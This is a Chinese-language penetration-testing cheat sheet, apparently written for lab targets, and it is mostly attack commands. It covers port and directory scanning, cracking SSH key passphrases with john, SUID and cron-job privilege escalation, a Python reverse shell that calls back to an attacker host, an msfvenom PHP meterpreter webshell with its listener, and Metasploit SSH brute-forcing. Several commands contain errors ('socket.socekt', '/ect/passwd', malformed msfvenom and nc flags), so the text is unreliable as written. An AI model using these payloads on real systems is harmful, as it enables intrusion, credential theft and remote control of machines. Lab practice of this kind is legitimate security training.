## SSH

### 端口探测

```shell
nmap -sV ip #扫描ip开放的端口
nmap -A -v ip #探测靶场全部信息
nmap -O ip #探测靶场操作系统类型和版本
```



###  探测端口

```shell
dirb http://ip:port #获得ip端口下的隐藏文件
```



### SSH私钥登入

```shell
chmod 600 id_rsa #id_rsa为私钥文件
ssh -i id_rsa user@ip
```



### 破解SSH秘钥密码

```shell
chmod 600 id_rsa #id_rsa为秘钥文件
ssh2john id_rsa > isacrack #isacrack为自命名文件
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack #利用字典破解isacrack信息
```



### 查找具有root权限的文件

```shell
-find / -perm -40000 2>/dev/null
```



### 溢出

运行程序，通常进行溢出跳转至/bin/sh操作，提升权限。



### 挖掘敏感信息

```shell
nikto -host ip #特别注意config等特殊敏感文件
```



### 扩大战果

```shell
whoami #查看当前用户
id #查看当前用户权限，同时查看根目录
su -root #获取root权限
cat /ect/passwd #查看所有用户的列表
cat /etc/group #查看用户组
find / -user 用户名 #查看属于某些用户的文件
/tmp #查看缓冲文件目录
```



### 深入挖掘

```shell
cat /etc/crontab #挖掘其他用户是否有定时任务，并查看对应的任务内容
```

如果在/etc/crontab下有某个用户的定时计划文件，但是具体目录下没有这个定时文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。

如果有定时执行文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。



### 反弹shell

靶场代码

```python
#!/usr/bin/python
import os, subprocess, socket

s = socket.socekt(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ip", "port"))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
```

攻击机netcat命令

```shell
nc -lpv 未占用端口
netstat -pantu #查看占用端口
```



### 背水一战

> 使用hydra、medusa等破解工具破解用户名对应的SSH服务。

利用cupp创建字典

```shell
git clone https://github.com/jeanphorn/common-password.git
chmod +x cupp.py
./cupp.py -i
```

使用metasploit破解SSH：

```shell
msfconsole
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set rhosts ip
msf auxiliary(ssh_login) > set username hadi
msf auxiliary(ssh_login) > set pass_file hadi.txt
msf auxiliary(ssh_login) > set threads 5
msf auxiliary(ssh_login) > set verbose true
msf auxiliary(ssh_login) > run
```

优化会话

```shell
msf auxiliary(ssh_login) > sessions -i 1
python -c "import pty; pty.spawn('/bin/bash')"
su -root
```



## SMB

### 信息探测

```sh
nmap -sV ip #挖掘开放服务
nmap -A -v -T4 ip #挖掘全部信息
```



### 弱点分析

```sh
smbclient -L ip
smbclient '\\ip\share$'
get 敏感文件
searchsploit samba版本号 #nmap -A -v ip //探测靶场全部信息
```



### HTTP

 1.浏览器查看网站

 2.扫描

```sh
dirb http://ip:port
```

 3.上传webshell

```sh
#制作webshell
msfvenom -p -php/meterpreter/reverse_tcp lhost=攻击机ip iport=4444 -f raw > ~/Desktop/shell.php
```



```sh
#启动监听
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 攻击机ip
set lport 4444
run
```



## FTP

### 信息探测

```shell
nmap -sV ip #扫描ip开放的端口
nmap -A -v ip #探测靶场全部信息
nmap -O ip #探测靶场操作系统类型和版本
```



### 发现漏洞

```sh
searchsploit ftp版本号 #nmap -A -v ip //探测靶场全部信息
```



### metasploit

找到集成到metasploit

![image-20211029223053775](statics/img/image-20211029223053775.png) 



## SQL

![image-20211030094808662](statics/img/image-20211030094808662.png)

打开敏感页面

![image-20211030094925907](statics/img/image-20211030094925907.png)

![image-20211030095003364](statics/img/image-20211030095003364.png)

![image-20211030095359009](statics/img/image-20211030095359009.png)

![image-20211030095545262](statics/img/image-20211030095545262.png)

![image-20211030095743682](statics/img/image-20211030095743682.png)

![image-20211030101109883](statics/img/image-20211030101109883.png)

![image-20211030101125322](statics/img/image-20211030101125322.png)

![image-20211030101218403](statics/img/image-20211030101218403.png)

![image-20211030101246505](statics/img/image-20211030101246505.png)
